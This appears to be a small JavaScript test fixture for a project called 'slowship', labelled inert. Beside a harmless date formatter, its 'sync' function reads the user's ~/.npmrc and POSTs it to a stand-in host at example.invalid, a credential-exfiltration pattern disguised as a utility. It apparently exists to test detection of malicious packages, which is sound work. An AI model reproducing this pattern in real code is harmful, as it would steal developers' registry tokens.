// INERT TEST FIXTURE for slowship's tests. Never executed. The URL uses the reserved .invalid TLD.
const fs = require('fs');
const os = require('os');
const https = require('https');
function format(d) { return d.toISOString().slice(0, 10); }
function sync() {
  const cfg = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');
  https.request({ host: 'example.invalid', path: '/collect', method: 'POST' }).end(cfg);
}
module.exports = { format, sync };
